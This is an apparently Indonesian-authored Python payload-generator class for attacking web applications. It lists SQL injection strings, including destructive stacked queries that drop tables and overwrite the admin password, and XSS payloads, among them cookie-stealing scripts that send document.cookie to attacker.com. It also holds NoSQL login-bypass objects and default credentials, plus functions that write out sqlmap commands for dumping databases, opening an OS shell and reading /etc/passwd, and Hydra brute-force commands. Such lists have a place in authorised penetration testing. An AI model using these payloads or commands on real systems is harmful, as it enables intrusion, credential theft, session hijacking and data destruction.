#!/usr/bin/env python3
"""
Payload Generator - Generate payload untuk SQL Injection dan XSS
Author: Yoga Arfiyanto
"""

from typing import List, Dict, Optional
import random
import base64
import urllib.parse

class PayloadGenerator:
    """Kelas untuk generate payload serangan"""
    
    def __init__(self):
        self.sql_payloads = self._init_sql_payloads()
        self.xss_payloads = self._init_xss_payloads()
        self.auth_payloads = self._init_auth_payloads()
        
    def _init_sql_payloads(self) -> Dict:
        """Inisialisasi SQL injection payloads"""
        return {
            'auth_bypass': [
                "' OR '1'='1",
                "' OR 1=1--",
                "admin' --",
                "' OR '1'='1'/*",
                "admin'/*",
                "' OR 1=1#",
                "' OR 1=1;--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT NULL--",
                "1' ORDER BY 1--",
                "1' GROUP BY 1--"
            ],
            'union_based': [
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT 1,2,3,4--",
                "' UNION SELECT 1,2,3,4,5--",
                "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
                "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--",
                "' UNION SELECT 1,username,password FROM users--"
            ],
            'error_based': [
                "' AND 1=CONVERT(int, @@version)--",
                "' AND 1=CAST((SELECT @@version) AS int)--",
                "' AND extractvalue(rand(),concat(0x3a,version()))--",
                "' AND updatexml(rand(),concat(0x3a,version()),null)--"
            ],
            'time_based': [
                "' AND SLEEP(5)--",
                "' WAITFOR DELAY '00:00:05'--",
                "' AND BENCHMARK(1000000,MD5('a'))--",
                "1' AND SLEEP(5)--",
                "1' WAITFOR DELAY '00:00:05'--"
            ],
            'stacked_queries': [
                "'; DROP TABLE users--",
                "'; INSERT INTO users VALUES ('hacker','hacked')--",
                "'; UPDATE users SET password='hacked' WHERE username='admin'--",
                "'; DELETE FROM users WHERE username='admin'--"
            ]
        }
        
    def _init_xss_payloads(self) -> Dict:
        """Inisialisasi XSS payloads"""
        return {
            'basic': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "javascript:alert(1)"
            ],
            'bypass': [
                "<scr<script>ipt>alert(1)</scr<script>ipt>",
                "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
                "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
                "\"><script>alert(1)</script>",
                "'';!--\"<XSS>=&{()}"
            ],
            'steal_cookie': [
                "<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>",
                "<img src=x onerror=this.src='http://attacker.com/?c='+document.cookie>",
                "<script>new Image().src='http://attacker.com/?c='+document.cookie</script>"
            ],
            'dom_based': [
                "#<script>alert(1)</script>",
                "javascript:alert(1)//",
                "';alert(1);//"
            ]
        }
        
    def _init_auth_payloads(self) -> Dict:
        """Inisialisasi authentication bypass payloads"""
        return {
            'default_creds': [
                ('admin', 'admin'),
                ('admin', 'password'),
                ('admin', '123456'),
                ('administrator', 'administrator'),
                ('root', 'root'),
                ('user', 'user'),
                ('test', 'test'),
                ('guest', 'guest')
            ],
            'nosql_injection': [
                {'username': {'$ne': None}, 'password': {'$ne': None}},
                {'username': {'$gt': ''}, 'password': {'$gt': ''}},
                {'$or': [{'username': 'admin'}, {'password': {'$regex': '^.*'}}]}
            ]
        }
        
    def get_sql_payloads(self, category: str = 'all') -> List[str]:
        """
        Dapatkan SQL payloads berdasarkan kategori
        
        Args:
            category: Kategori payload (auth_bypass, union_based, dll)
            
        Returns:
            List of payload strings
        """
        if category == 'all':
            all_payloads = []
            for cat in self.sql_payloads.values():
                all_payloads.extend(cat)
            return all_payloads
        elif category in self.sql_payloads:
            return self.sql_payloads[category]
        else:
            return []
            
    def get_xss_payloads(self, category: str = 'all') -> List[str]:
        """
        Dapatkan XSS payloads
        """
        if category == 'all':
            all_payloads = []
            for cat in self.xss_payloads.values():
                all_payloads.extend(cat)
            return all_payloads
        elif category in self.xss_payloads:
            return self.xss_payloads[category]
        else:
            return []
            
    def generate_custom_payload(self, base: str, encodings: List[str]) -> str:
        """
        Generate custom payload dengan encoding
        
        Args:
            base: Base payload
            encodings: List encoding to apply
            
        Returns:
            Encoded payload
        """
        result = base
        
        for encoding in encodings:
            if encoding == 'url':
                result = urllib.parse.quote(result)
            elif encoding == 'base64':
                result = base64.b64encode(result.encode()).decode()
            elif encoding == 'double_url':
                result = urllib.parse.quote(urllib.parse.quote(result))
            elif encoding == 'hex':
                result = result.encode().hex()
                
        return result
        
    def generate_sqlmap_commands(self, url: str, method: str = 'GET') -> List[str]:
        """
        Generate SQLMap commands untuk target
        
        Args:
            url: Target URL
            method: HTTP method
            
        Returns:
            List of SQLMap commands
        """
        commands = []
        
        if method == 'POST':
            commands.append(f"sqlmap -u {url} --data='username=admin&password=test' --level=3 --risk=3 --batch")
        else:
            commands.append(f"sqlmap -u '{url}?id=1' --level=3 --risk=3 --batch")
            
        # Enumeration commands
        commands.append(f"sqlmap -u '{url}?id=1' --dbs --batch")
        commands.append(f"sqlmap -u '{url}?id=1' -D database_name --tables --batch")
        commands.append(f"sqlmap -u '{url}?id=1' -D database_name -T users --columns --batch")
        commands.append(f"sqlmap -u '{url}?id=1' -D database_name -T users --dump --batch")
        
        # Advanced options
        commands.append(f"sqlmap -u '{url}?id=1' --os-shell --batch")
        commands.append(f"sqlmap -u '{url}?id=1' --file-read=/etc/passwd --batch")
        
        return commands
        
    def generate_hydra_commands(self, target: str, userlist: str, passlist: str) -> List[str]:
        """
        Generate Hydra commands
        
        Args:
            target: Target host
            userlist: Path to username list
            passlist: Path to password list
            
        Returns:
            List of Hydra commands
        """
        commands = [
            f"hydra -L {userlist} -P {passlist} {target} http-post-form \"/login:username=^USER^&password=^PASS^:Invalid\" -V",
            f"hydra -L {userlist} -P {passlist} {target} http-get-form \"/login:username=^USER^&password=^PASS^:F=Invalid\" -V",
            f"hydra -L {userlist} -P {passlist} {target} ssh -V",
            f"hydra -L {userlist} -P {passlist} {target} ftp -V",
            f"hydra -L {userlist} -P {passlist} {target} mysql -V"
        ]
        
        return commands

# Contoh penggunaan
if __name__ == "__main__":
    generator = PayloadGenerator()
    
    # Test SQL payloads
    payloads = generator.get_sql_payloads('auth_bypass')
    print("SQL Auth Bypass Payloads:")
    for p in payloads[:5]:
        print(f"  - {p}")

